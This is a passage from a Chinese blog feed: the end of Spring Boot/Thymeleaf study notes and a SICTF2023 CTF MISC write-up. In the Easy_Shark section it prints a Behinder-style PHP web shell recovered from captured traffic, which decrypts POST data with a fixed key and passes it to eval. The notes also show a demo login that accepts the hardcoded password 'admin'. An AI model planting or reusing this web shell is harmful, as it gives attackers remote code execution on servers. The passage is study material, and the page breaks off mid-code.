class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>Age: <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">th:text</span>=<span class="hljs-string">&quot;$</span></span></span><span class="hljs-template-variable">&#123;user.age&#125;</span><span class="language-xml"><span class="hljs-tag"><span class="hljs-string">&quot;</span>&gt;</span>18<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>.<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span></span><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>Detail: <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">th:text</span>=<span class="hljs-string">&quot;$</span></span></span><span class="hljs-template-variable">&#123;user.detail&#125;</span><span class="language-xml"><span class="hljs-tag"><span class="hljs-string">&quot;</span>&gt;</span>好好学习<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>.<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span></span><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span></code></pre></div><p>th:utext&#x3D;”${msg}”         <code>&lt;h1&gt;123&lt;/h1&gt;</code>能够被成功解析</p><p>${对象.get方法名}</p><p>th:each&#x3D;”user:${users}” th:text&#x3D;”${user}”</p><p>MVC配置</p><div class="code-wrapper"><pre><code class="hljs aspectj"><span class="hljs-meta">@Configuration</span><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MyMvcConfig</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">WebMvcConfigurer</span> </span>&#123;    <span class="hljs-meta">@Bean</span>    <span class="hljs-keyword">public</span> <span class="hljs-function">ViewResolver <span class="hljs-title">myview</span><span class="hljs-params">()</span></span>&#123;        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> MyViewResolver();    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MyViewResolver</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">ViewResolver</span></span>&#123;        <span class="hljs-meta">@Override</span>        <span class="hljs-keyword">public</span> <span class="hljs-function">View <span class="hljs-title">resolveViewName</span><span class="hljs-params">(String viewName, Locale locale)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;            <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;        &#125;    &#125;&#125;</code></pre></div><h2 id="员工管理系统"><a href="#员工管理系统" class="headerlink" title="员工管理系统"></a>员工管理系统</h2><p>所有页面的静态资源都需要使用thymeleaf接管（）</p><p>标上xmlns:th&#x3D;”<a href="http://www.thymeleaf.org/">http://www.thymeleaf.org</a>“ ，以及修改href和src….等本地链接</p><p>th:href    th:src     th:link  @{&#x2F;}</p><h3 id="国际化"><a href="#国际化" class="headerlink" title="国际化  #{}"></a>国际化  #{}</h3><p>即页面的中英文转化</p><p>先创建<code>login.properties</code>，再创建<code>login_zh_CN.properties</code></p><p><img src="/2023/09/11/java%E5%9F%BA%E7%A1%80%E5%92%8Cspringboot/image-20230914183413701.png" alt="image-20230914183413701"></p><p>然后设置信息</p><p>设置完后spring.messages.basename&#x3D;i18n.login</p><p>然后在html中对应的显示位置     添加 th:xx&#x3D;”#{}” </p><div class="code-wrapper"><pre><code class="hljs avrasm"><span class="hljs-symbol">th:</span>href=<span class="hljs-string">&quot;@&#123;/index.html(l=zh_CN)&#125;&quot;</span><span class="hljs-symbol">th:</span>href=<span class="hljs-string">&quot;@&#123;/index.html(l=en_US)&#125;&quot;</span></code></pre></div><div class="code-wrapper"><pre><code class="hljs reasonml">点击按钮转换中英文，设置组件LocaleResolverpublic <span class="hljs-keyword">class</span> myLocaleResolver implements LocaleResolver &#123;    @Override    public Locale resolve<span class="hljs-constructor">Locale(HttpServletRequest <span class="hljs-params">request</span>)</span> &#123;        String language = request.get<span class="hljs-constructor">Parameter(<span class="hljs-string">&quot;l&quot;</span>)</span>;        Locale locale = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Locale</span>.</span></span>get<span class="hljs-constructor">Default()</span>;        <span class="hljs-keyword">if</span> (!<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">StringUtils</span>.</span></span>is<span class="hljs-constructor">Empty(<span class="hljs-params">language</span>)</span>)&#123;            <span class="hljs-comment">//zh_CN</span>            String<span class="hljs-literal">[]</span> s = language.split(<span class="hljs-string">&quot;_&quot;</span>);            <span class="hljs-comment">//语言，国家</span>            locale = <span class="hljs-keyword">new</span> <span class="hljs-constructor">Locale(<span class="hljs-params">s</span>[0],<span class="hljs-params">s</span>[1])</span>;        &#125;        return locale;    &#125;    @Override    public void set<span class="hljs-constructor">Locale(HttpServletRequest <span class="hljs-params">request</span>, HttpServletResponse <span class="hljs-params">response</span>, Locale <span class="hljs-params">locale</span>)</span> &#123;    &#125;&#125;</code></pre></div><p>然后在自定义的myMvcConfig中放入@Bean中</p><div class="code-wrapper"><pre><code class="hljs typescript"><span class="hljs-meta">@Bean</span><span class="hljs-keyword">public</span> <span class="hljs-title class_">LocaleResolver</span> <span class="hljs-title function_">localeResolver</span>(<span class="hljs-params"></span>)&#123;    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title function_">myLocaleResolver</span>();&#125;</code></pre></div><h3 id="登录"><a href="#登录" class="headerlink" title="登录"></a>登录</h3><div class="code-wrapper"><pre><code class="hljs typescript"><span class="hljs-meta">@Controller</span><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">loginController</span> &#123;    <span class="hljs-meta">@RequestMapping</span>(<span class="hljs-string">&quot;/login&quot;</span>)    <span class="hljs-keyword">public</span> <span class="hljs-title class_">String</span> <span class="hljs-title function_">login</span>(<span class="hljs-params"><span class="hljs-meta">@RequestParam</span>(<span class="hljs-string">&quot;username&quot;</span>) <span class="hljs-built_in">String</span> username, <span class="hljs-meta">@RequestParam</span>(<span class="hljs-string">&quot;password&quot;</span>) <span class="hljs-built_in">String</span> password, Model model</span>)&#123;        <span class="hljs-keyword">if</span> (!<span class="hljs-title class_">StringUtils</span>.<span class="hljs-title function_">isEmpty</span>(username) &amp;&amp; <span class="hljs-string">&quot;admin&quot;</span>.<span class="hljs-title function_">equals</span>(password))&#123;            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;index&quot;</span>;            <span class="hljs-comment">//先在mvc中添加映射，然后跳转</span>            <span class="hljs-comment">//return &quot;redirect:/main.html&quot;; </span>        &#125;        <span class="hljs-keyword">else</span> &#123;        <span class="hljs-comment">//提示信息</span>            model.<span class="hljs-title function_">addAttribute</span>(<span class="hljs-string">&quot;msg&quot;</span>,<span class="hljs-string">&quot;用户名或密码错误&quot;</span>);            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;login&quot;</span>;        &#125;    &#125;&#125;</code></pre></div><div class="code-wrapper"><pre><code class="hljs routeros">&lt;p th:<span class="hljs-attribute">text</span>=<span class="hljs-string">&quot;<span class="hljs-variable">$&#123;msg&#125;</span>&quot;</span> th:<span class="hljs-attribute">if</span>=<span class="hljs-string">&quot;<span class="hljs-variable">$&#123;not #strings.isEmpty(msg)&#125;</span>&quot;</span>&gt;&lt;/p&gt;</code></pre></div><h3 id="拦截器"><a href="#拦截器" class="headerlink" title="拦截器"></a>拦截器</h3><div class="code-wrapper"><pre><code class="hljs aspectj"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">loginInterceptor</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">HandlerInterceptor</span> </span>&#123;    <span class="hljs-meta">@Override</span>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">boolean</span> <span class="hljs-title">preHandle</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response, Object <span class="hljs-keyword">handler</span>)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;        <span class="hljs-comment">//获取session</span>        Object loginuser = request.getSession().getAttribute(<span class="hljs-string">&quot;loginuser&quot;</span>);        <span class="hljs-keyword">if</span> (loginuser==<span class="hljs-keyword">null</span>)&#123;            request.setAttribute(<span class="hljs-string">&quot;msg&quot;</span>,<span class="hljs-string">&quot;请先登录&quot;</span>);          request.getRequestDispatcher(<span class="hljs-string">&quot;/login.html&quot;</span>).forward(request,response);          <span class="hljs-comment">//跳转</span>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;        &#125;<span class="hljs-keyword">else</span> &#123;            <span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;        &#125;    &#125;&#125;</code></pre></div><p>mvc中添加</p><div class="code-wrapper"><pre><code class="hljs reasonml">@Overridepublic void add<span class="hljs-constructor">Interceptors(InterceptorRegistry <span class="hljs-params">registry</span>)</span> &#123;    registry.add<span class="hljs-constructor">Interceptor(<span class="hljs-params">new</span> <span class="hljs-params">loginInterceptor</span>()</span>).add<span class="hljs-constructor">PathPatterns(<span class="hljs-string">&quot;/**&quot;</span>)</span>.exclude<span class="hljs-constructor">PathPatterns(<span class="hljs-string">&quot;/&quot;</span>,<span class="hljs-string">&quot;/login.html&quot;</span>,<span class="hljs-string">&quot;/about.html&quot;</span>,<span class="hljs-string">&quot;/contact.html&quot;</span>,<span class="hljs-string">&quot;/js/**&quot;</span>,<span class="hljs-string">&quot;/css/*&quot;</span>,<span class="hljs-string">&quot;/img/*&quot;</span>)</span>;&#125;</code></pre></div><div class="code-wrapper"><pre><code class="hljs typescript"><span class="hljs-meta">@RequestMapping</span>(<span class="hljs-string">&quot;/login.html&quot;</span>)<span class="hljs-keyword">public</span> <span class="hljs-title class_">String</span> <span class="hljs-title function_">login</span>(<span class="hljs-params"><span class="hljs-meta">@RequestParam</span>(<span class="hljs-string">&quot;username&quot;</span>) <span class="hljs-built_in">String</span> username, <span class="hljs-meta">@RequestParam</span>(<span class="hljs-string">&quot;password&quot;</span>) <span class="hljs-built_in">String</span> password, Model model, HttpSession session</span>)&#123;    <span class="hljs-keyword">if</span> (!<span class="hljs-title class_">StringUtils</span>.<span class="hljs-title function_">isEmpty</span>(username) &amp;&amp; <span class="hljs-string">&quot;admin&quot;</span>.<span class="hljs-title function_">equals</span>(password))&#123;        session.<span class="hljs-title function_">setAttribute</span>(<span class="hljs-string">&quot;loginuser&quot;</span>,username);        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;redirect:index.html&quot;</span>;</code></pre></div><h2 id="员工列表"><a href="#员工列表" class="headerlink" title="员工列表"></a>员工列表</h2><p>提取公共页面</p><p>把相同的代码添加一个属性   th:fragment&#x3D;”sidebar”</p><p>调用  th:replace&#x3D;”~{commons&#x2F;commons::topbar}”    &#x2F;&#x2F;定义属性的位置</p><p>高亮</p><p> ()传递参数  ~{commons&#x2F;commons::topbar(active&#x3D;”index.html”)}</p><p><code>th:xx=&quot;$&#123;active==&#39;index.html&#39;?&#39;nav-link active&#39;:&#39;nav-link&#39;&#125;&quot;</code>    三元运算符判断是否高亮</p><p>展示员工界面</p><div class="code-wrapper"><pre><code class="hljs dust"><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">tr</span> <span class="hljs-attr">th:each</span>=<span class="hljs-string">&quot;user:$</span></span></span><span class="hljs-template-variable">&#123;users&#125;</span><span class="language-xml"><span class="hljs-tag"><span class="hljs-string">&quot;</span>&gt;</span></span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">td</span> <span class="hljs-attr">th:text</span>=<span class="hljs-string">&quot;$</span></span></span><span class="hljs-template-variable">&#123;user.getId()&#125;</span><span class="language-xml"><span class="hljs-tag"><span class="hljs-string">&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span></span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">td</span> <span class="hljs-attr">th:text</span>=<span class="hljs-string">&quot;$</span></span></span><span class="hljs-template-variable">&#123;user.getName()&#125;</span><span class="language-xml"><span class="hljs-tag"><span class="hljs-string">&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span></span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">td</span> <span class="hljs-attr">th:text</span>=<span class="hljs-string">&quot;$</span></span></span><span class="hljs-template-variable">&#123;user.getAge()&#125;</span><span class="language-xml"><span class="hljs-tag"><span class="hljs-string">&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span></span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">td</span> <span class="hljs-attr">th:text</span>=<span class="hljs-string">&quot;$</span></span></span><span class="hljs-template-variable">&#123;user.getId()&#125;</span><span class="language-xml"><span class="hljs-tag"><span class="hljs-string">&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span></span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">td</span> <span class="hljs-attr">th:text</span>=<span class="hljs-string">&quot;$</span></span></span><span class="hljs-template-variable">&#123;user.getId()&#125;</span><span class="language-xml"><span class="hljs-tag"><span class="hljs-string">&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span></span><span class="language-xml"></span><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span></span></code></pre></div><h2 id=""><a href="#" class="headerlink" title=""></a></h2>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>sictf2023</title>
    <link href="/2023/09/10/sictf2023/"/>
    <url>/2023/09/10/sictf2023/</url>
    
    <content type="html"><![CDATA[<h1 id="SICTF2023"><a href="#SICTF2023" class="headerlink" title="SICTF2023"></a>SICTF2023</h1><p>就记录一些不会的题</p><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="baby-zip"><a href="#baby-zip" class="headerlink" title="baby_zip"></a>baby_zip</h3><p>明文攻击+lsb隐写（010打开就行）</p><div class="code-wrapper"><pre><code class="hljs vim"><span class="hljs-keyword">echo</span> -n <span class="hljs-string">&quot;89504e470d0a1a0a0000000d49484452&quot;</span> |xxd -r -<span class="hljs-keyword">ps</span> &gt; key.txt</code></pre></div><p><img src="/2023/09/10/sictf2023/image-20230910160932339.png" alt="image-20230910160932339"></p><p><img src="/2023/09/10/sictf2023/image-20230910161008575.png" alt="image-20230910161008575"></p><p>我的当时思路：</p><p>压缩包有密码，尝试伪加密，破解后显示crc错误，自己构造一个带图片的压缩包，对比发现原压缩包图片内容没有文件头部分，然后就尝试自己加，但是宽高不知道，crc写不了，最终也没有办法了</p><h3 id="QR-QR-QR"><a href="#QR-QR-QR" class="headerlink" title="QR_QR_QR"></a>QR_QR_QR</h3><p>这个当时没时间写了,结束后也想自己尝试下，但还是失败了（才知道是python的问题，不是我的。。。。。）</p><p>自己的想法：</p><p>很明显01转二维码（第一次在不知道wp的情况下写脚本），成功后以为每次都一样，但是多次尝试后发现是不一样的，然后就像提示说的使用pwntool，还挺简单的，接着关键一步就是识别二维码的脚本，网上发现无非就是两种(pyzbar库和cv2库)，但我使用都出了问题</p><p>看了眼wp，基本是一样的，但是因为pyzbar库报错不能成功，服了。。。。</p><div class="code-wrapper"><pre><code class="hljs elm"><span class="hljs-title">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-title">from</span> <span class="hljs-type">PIL</span> <span class="hljs-keyword">import</span> Image<span class="hljs-title">from</span> pyzbar.pyzbar <span class="hljs-keyword">import</span> decode<span class="hljs-title">img</span> = <span class="hljs-type">Image</span>.new(<span class="hljs-string">&quot;RGB&quot;</span>,(<span class="hljs-number">115</span>,<span class="hljs-number">115</span>))<span class="hljs-title">p</span> = remote(<span class="hljs-string">&quot;host&quot;</span>,<span class="hljs-keyword">port</span>)for i in range(115):    a = p.recvline().strip().decode()    for j in range(115):        if(a[j]==&#x27;0&#x27;):            img.putpixel((i,j),(255,255,255))        else:            img.putpixel((i,j),(0,0,0))p.sendline(decode(img)[0][0])</code></pre></div><p>应该能成功，失败的话自己网上找一下识别二维码的代码去替换一下</p><p>看了WP说还要解1000次才出flag。。。。。。</p><p>别人的完整WP</p><div class="code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> cv2<span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<span class="hljs-keyword">from</span> pyzbar.pyzbar <span class="hljs-keyword">import</span> decoder=remote(<span class="hljs-string">&quot;host&quot;</span>,port)count = <span class="hljs-number">0</span><span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>):    count += <span class="hljs-number">1</span>    <span class="hljs-built_in">print</span>(count)    data = <span class="hljs-built_in">list</span>(r.recvuntil(<span class="hljs-string">b&quot;P&quot;</span>)[:-<span class="hljs-number">1</span>])    <span class="hljs-comment"># 定义图像的宽度和高度（根据数据长度调整）</span>    width = <span class="hljs-number">116</span>    height = <span class="hljs-number">116</span>    <span class="hljs-comment"># 创建一个空白图像</span>    image = Image.new(<span class="hljs-string">&quot;1&quot;</span>, (width, height), color=<span class="hljs-number">1</span>)  <span class="hljs-comment"># 1表示单色（黑白）</span>    <span class="hljs-comment"># 获取图像的像素访问对象</span>    pixels = image.load()    <span class="hljs-comment"># 将01数据填充到图像中</span>    <span class="hljs-keyword">for</span> y <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(height):        <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(width):            index = y * width + x            <span class="hljs-keyword">if</span> index &lt; <span class="hljs-built_in">len</span>(data) <span class="hljs-keyword">and</span> data[index] == <span class="hljs-number">48</span>:                pixels[x, y] = <span class="hljs-number">0</span>  <span class="hljs-comment"># 将0写为黑色像素点</span>            <span class="hljs-keyword">else</span>:                pixels[x, y] = <span class="hljs-number">1</span>  <span class="hljs-comment"># 将0写为黑色像素点</span>    <span class="hljs-comment"># 保存图像为文件</span>    image.save(<span class="hljs-string">&quot;1.png&quot;</span>)    decocdeQR = decode(Image.<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;1.png&quot;</span>))[<span class="hljs-number">0</span>].data    r.sendline(decocdeQR)    temp = r.recvline()    <span class="hljs-built_in">print</span>(temp)    temp = r.recvline()    <span class="hljs-built_in">print</span>(temp)</code></pre></div><h3 id="Pixel-art"><a href="#Pixel-art" class="headerlink" title="Pixel_art"></a>Pixel_art</h3><p>赛后讨论说是提取像素脚本然后解密OOK</p><p>但即使知道思路，还是不知道怎么做，等着看WP吧</p><p>压缩包伪加密得到图片，stegsolve查看lsb隐写，发现图片（就只做到这里）</p><p>大小仅有20*20，不难想到flag被加密进了像素点里。写一个脚本提取像素点：</p><div class="code-wrapper"><pre><code class="hljs maxima">from PIL import Imageimg = Image.open(&#x27;&#x27;)<span class="hljs-built_in">width</span>,<span class="hljs-built_in">height</span> = img.sizepix = []<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">width</span>):    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">height</span>):        pix.<span class="hljs-built_in">append</span>(img.getpixel(i,j))<span class="hljs-built_in">print</span>(pix)</code></pre></div><div class="code-wrapper"><pre><code class="hljs scheme">[(<span class="hljs-name">46</span>, <span class="hljs-number">46</span>, <span class="hljs-number">46</span>), (<span class="hljs-name">46</span>, <span class="hljs-number">46</span>, <span class="hljs-number">46</span>), (<span class="hljs-name">46</span>, <span class="hljs-number">46</span>, <span class="hljs-number">46</span>), (<span class="hljs-name">46</span>, <span class="hljs-number">46</span>, <span class="hljs-number">46</span>), (<span class="hljs-name">46</span>, <span class="hljs-number">46</span>, <span class="hljs-number">46</span>), (<span class="hljs-name">46</span>, <span class="hljs-number">46</span>, <span class="hljs-number">46</span>), (<span class="hljs-name">33</span>, <span class="hljs-number">63</span>, <span class="hljs-number">33</span>), (<span class="hljs-name">33</span>, <span class="hljs-number">46</span>, <span class="hljs-number">63</span>), (<span class="hljs-name">46</span>, <span class="hljs-number">46</span>, <span class="hljs-number">46</span>), (<span class="hljs-name">46</span>, <span class="hljs-number">46</span>, <span class="hljs-number">46</span>), (<span class="hljs-name">46</span>, <span class="hljs-number">46</span>, <span class="hljs-number">46</span>), (<span class="hljs-name">46</span>, <span class="hljs-number">46</span>, <span class="hljs-number">46</span>), (<span class="hljs-name">46</span>, <span class="hljs-number">46</span>, <span class="hljs-number">46</span>), (<span class="hljs-name">46</span>, <span class="hljs-number">46</span>, <span class="hljs-number">46</span>), (<span class="hljs-name">63</span>, <span class="hljs-number">46</span>, <span class="hljs-number">63</span>), (<span class="hljs-name">33</span>, <span class="hljs-number">46</span>, <span class="hljs-number">63</span>), (<span class="hljs-name">46</span>, <span class="hljs-number">46</span>, <span class="hljs-number">46</span>), (<span class="hljs-name">46</span>, <span class="hljs-number">33</span>, <span class="hljs-number">46</span>), (<span class="hljs-name">63</span>, <span class="hljs-number">46</span>, <span class="hljs-number">46</span>), (<span class="hljs-name">46</span>, <span class="hljs-number">46</span>, <span class="hljs-number">46</span>), (<span class="hljs-name">46</span>, <span class="hljs-number">46</span>, <span class="hljs-number">33</span>), (<span class="hljs-name">63</span>, <span class="hljs-number">33</span>, <span class="hljs-number">33</span>), (<span class="hljs-name">46</span>, <span class="hljs-number">63</span>, <span class="hljs-number">33</span>), (<span class="hljs-name">33</span>, <span class="hljs-number">33</span>, <span class="hljs-number">33</span>), (<span class="hljs-name">33</span>, <span class="hljs-number">33</span>, <span class="hljs-number">63</span>), (<span class="hljs-name">46</span>, <span class="hljs-number">63</span>, <span class="hljs-number">33</span>), (<span class="hljs-name">46</span>, <span class="hljs-number">63</span>, <span class="hljs-number">33</span>), ......, (<span class="hljs-name">46</span>, <span class="hljs-number">46</span>, <span class="hljs-number">33</span>), (<span class="hljs-name">46</span>, <span class="hljs-number">63</span>, <span class="hljs-number">46</span>), (<span class="hljs-name">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>), (<span class="hljs-name">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>), (<span class="hljs-name">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>), (<span class="hljs-name">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>), (<span class="hljs-name">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>), (<span class="hljs-name">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>), (<span class="hljs-name">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>), (<span class="hljs-name">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>)]</code></pre></div><div class="code-wrapper"><pre><code class="hljs cos">对应<span class="hljs-keyword">ASCII</span>码<span class="hljs-number">46</span>-. <span class="hljs-number">33</span>-!<span class="hljs-number">63</span>-?</code></pre></div><p>然后联想到Ook</p><div class="code-wrapper"><pre><code class="hljs maxima">from PIL import Image<span class="hljs-built_in">image</span> = Image.open(&#x27;&#x27;)  # 替换为隐写出来的图片<span class="hljs-built_in">width</span>, <span class="hljs-built_in">height</span> = <span class="hljs-built_in">image</span>.sizepixel_data = []<span class="hljs-keyword">for</span> y <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">height</span>):    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">width</span>):        pixel = <span class="hljs-built_in">image</span>.getpixel((x, y))        pixel_data.<span class="hljs-built_in">append</span>(pixel)count = <span class="hljs-number">0</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(len(pixel_data)):    <span class="hljs-keyword">if</span>(pixel_data[i] == (<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>)):        <span class="hljs-built_in">break</span>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> pixel_data[i]:        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Ook&quot;</span>+chr(j),end = <span class="hljs-string">&quot;&quot;</span>)</code></pre></div><h3 id="Easy-Shark"><a href="#Easy-Shark" class="headerlink" title="Easy_Shark"></a>Easy_Shark</h3><p>自己的思路：提取http对象，发现上传的shell.php的内容，以及上传的一些数据</p><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>@<span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<span class="hljs-title function_ invoke__">session_start</span>();    <span class="hljs-variable">$key</span>=<span class="hljs-string">&quot;2295d22e2d70888f&quot;</span>;<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;k&#x27;</span>]=<span class="hljs-variable">$key</span>;<span class="hljs-variable">$post</span>=<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;php://input&quot;</span>);<span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">extension_loaded</span>(<span class="hljs-string">&#x27;openssl&#x27;</span>))&#123;<span class="hljs-variable">$t</span>=<span class="hljs-string">&quot;base64_&quot;</span>.<span class="hljs-string">&quot;decode&quot;</span>;<span class="hljs-variable">$post</span>=<span class="hljs-variable">$t</span>(<span class="hljs-variable">$post</span>.<span class="hljs-string">&quot;&quot;</span>);<span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$post</span>);<span class="hljs-variable">$i</span>++) &#123;     <span class="hljs-variable">$post</span>[<span class="hljs-variable">$i</span>] = <span class="hljs-variable">$post</span>[<span class="hljs-variable">$i</span>]^<span class="hljs-variable">$key</span>[<span class="hljs-variable">$i</span>+<span class="hljs-number">1</span>&amp;<span class="hljs-number">15</span>];     &#125;&#125;<span class="hljs-keyword">else</span>&#123;<span class="hljs-variable">$post</span>=<span class="hljs-title function_ invoke__">openssl_decrypt</span>(<span class="hljs-variable">$post</span>, <span class="hljs-string">&quot;AES128&quot;</span>, <span class="hljs-variable">$key</span>);&#125;    <span class="hljs-variable">$arr</span>=<span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&#x27;|&#x27;</span>,<span class="hljs-variable">$post</span>);    <span class="hljs-variable">$func</span>=<span class="hljs-variable">$arr</span>[<span class="hljs-number">0</span>];    <span class="hljs-variable">$params</span>=<span class="hljs-variable">$arr</span>[<span class="hljs-number">1</span>];<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">C</span></span>&#123;<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"><span class="hljs-variable">$p</span></span>) </span>&#123;<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$p</span>.<span class="hljs-string">&quot;&quot;</span>);&#125;&#125;    @<span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">C</span>(),<span class="hljs-variable">$params</span>);<span class="hljs-meta">?&gt;</span></code></pre></div><p>想着是上传的内容然后对应解密，但还是没思路，应该还是没看懂这段代码的原因</p><p>WP的思路差不多，对数据进行对应解密（我当时少了一层base64，只拿去AES解密导致什么都看不出来）</p><p>拿到加密方式后，可以看出，在openssl扩展有效时，这段代码对数据的解密方式为AES_128后base64，并且给了key的值(之后了解到这是很明显的<strong>冰蝎</strong>的特征)。那么就可以使用cyberchef，对之后的每个tcp流里的base64数据进行恢复：</p><p><img src="/2023/09/10/sictf2023/image-20230910182126677.png" alt="image-20230910182126677"></p><p>圈起来的地方注意一下，iv自行补0直到出现内容即可</p><p>然后把里面的信息解密出来看看</p><p><img src="/2023/09/10/sictf2023/image-20230910182455111.png" alt="image-20230910182455111"></p><p>tcp流有很多，大佬们贴出来的图是</p><p><img src="/2023/09/10/sictf2023/image-20230910182605633.png" alt="image-20230910182605633"></p><p>由此去解密响应信息（响应数据太多了，复现找不到两个文本的内容）</p><p><img src="/2023/09/10/sictf2023/image-20230910182736580.png" alt="image-20230910182736580"></p><p>GronKey.txt：</p><div class="code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>,<span class="hljs-number">50</span>,<span class="hljs-number">61</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>,<span class="hljs-number">20</span>,<span class="hljs-number">63</span>,<span class="hljs-number">41</span></code></pre></div><p>flag.txt：</p><div class="code-wrapper"><pre><code class="hljs ebnf"><span class="hljs-attribute">TGLBOMSJNSRAJAZDEZXGHSJNZWHG</span></code></pre></div><p>根据GronKey找到Gronsfeld加密</p><p>（类似于凯撒这样的移位密码，每个字符根据对应数字进行移位，若密钥长度小于字符串，就从头再次开始）</p><div class="code-wrapper"><pre><code class="hljs pgsql"><span class="hljs-keyword">from</span>  Crypto.Util.number <span class="hljs-keyword">import</span> *<span class="hljs-keyword">from</span> pycipher <span class="hljs-keyword">import</span> Gronsfeldt = [<span class="hljs-number">1</span>,<span class="hljs-number">50</span>,<span class="hljs-number">61</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>,<span class="hljs-number">20</span>,<span class="hljs-number">63</span>,<span class="hljs-number">41</span>]<span class="hljs-keyword">temp</span> = &quot;TGLBOMSJNSRAJAZDEZXGHSJNZWHG&quot;print (Gronsfeld(t).decipher(<span class="hljs-keyword">temp</span>))</code></pre></div><div class="code-wrapper"><pre><code 